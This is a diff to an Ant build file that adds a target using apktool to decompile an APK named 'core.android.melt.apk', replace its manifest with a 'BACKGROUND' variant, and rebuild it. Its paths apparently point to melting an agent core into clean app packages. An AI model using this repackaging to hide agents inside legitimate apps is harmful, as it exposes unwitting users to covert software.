@@ -400,6 +400,16 @@
 
 		<antcall target="merge" />
 	</target>
+	
+	<target name="repackmerge" >
+		<java fork="true" jar="server/core/apktool.jar" dir="output/merge">
+			<arg line="d -r -s -f core.android.melt.apk"/>
+		</java>
+		<copy file="preprocess/AndroidManifest.BACKGROUND.xml" toFile="output/merge/core.android.melt/AndroidManifest.xml" overwrite="true" />
+		<java fork="true" jar="server/core/apktool.jar" dir="output/merge">
+			<arg line="b -f core.android.melt.pre core.android.melt.apk"/>
+		</java>
+	</target>
 
 	<target name="merge" depends="init">
 		<antcall target="clean" />
@@ -412,6 +422,7 @@
 		<mkdir dir="output/merge/" />
 		<copy file="${filename}" toFile="output/merge/core.android.melt.apk" overwrite="true" />		
 		<copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" />
+		
 		<echo>../../merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
 	</target>
 	
@@ -449,6 +460,7 @@
 		</copy>
 		
 		<copy file="output/merge/core.android.melt.apk" toDir="server/core" overwrite="true" />
+		<copy file="preprocess/AndroidManifest.BACKGROUND.xml" toFile="server/core/AndroidManifest.xml" overwrite="true" />
 
 		<zip destfile="server/android_${version}.zip" basedir="server/core" />
 	</target>
